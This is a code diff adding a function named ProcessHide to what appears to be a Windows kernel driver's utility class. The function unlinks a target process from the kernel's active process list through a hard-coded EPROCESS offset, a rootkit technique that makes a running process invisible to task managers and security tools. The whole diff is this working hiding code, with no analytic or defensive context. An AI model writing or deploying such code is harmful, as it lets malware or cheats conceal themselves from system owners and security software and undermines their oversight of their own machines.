@@ -266,3 +266,37 @@ DWORD64 Utils::GetModuleBase64(IN PEPROCESS pEProcess, IN UNICODE_STRING moduleN
 	KeUnstackDetachProcess(&kapc);
 	return 0;
 }
+
+BOOL Utils::ProcessHide(IN DWORD pid)
+{
+	PEPROCESS pEProcess = NULL;
+
+	PsLookupProcessByProcessId((HANDLE)pid, &pEProcess);
+	if (pEProcess == NULL)
+	{
+		return FALSE;
+	}
+
+	KIRQL oldIrql;
+	PLIST_ENTRY ListEntry = (PLIST_ENTRY)((ULONG64)pEProcess + 0x448);
+	oldIrql = KeRaiseIrqlToDpcLevel();
+	if (ListEntry->Flink != ListEntry &&
+		ListEntry->Blink != ListEntry &&
+		ListEntry->Blink->Flink == ListEntry &&
+		ListEntry->Flink->Blink == ListEntry
+		)
+	{
+		ListEntry->Flink->Blink = ListEntry->Blink;
+		ListEntry->Blink->Flink = ListEntry->Flink;
+		ListEntry->Flink = ListEntry;
+		ListEntry->Blink = ListEntry;
+
+		KeLowerIrql(oldIrql);
+		return TRUE;
+	}
+	else
+	{
+		KeLowerIrql(oldIrql);
+		return FALSE;
+	}
+}
